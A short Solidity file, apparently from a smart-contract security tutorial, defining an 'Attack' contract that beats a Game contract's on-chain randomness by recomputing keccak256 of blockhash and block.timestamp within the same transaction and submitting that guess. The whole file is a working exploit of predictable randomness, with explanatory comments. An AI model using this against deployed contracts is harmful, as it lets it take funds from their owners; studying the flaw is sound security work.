// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import "./game.sol";
contract Attack {

    Game game;

    constructor(Game _game){
        game = Game(_game);
    }

    function attack() public {
         // `abi.encodePacked` takes in the two params - `blockhash` and `block.timestamp`
          // and returns a byte array which further gets passed into keccak256 which returns `bytes32`
          // which is further converted to a `uint`.
          // keccak256 is a hashing function which takes in a bytes array and converts it into a bytes32

          // block.number, and block.timestamp will be the same for the entire execution of this function
          // although it will be calling another contract
          uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
          game.guess(_guess);
    }

    receive() external payable{}
}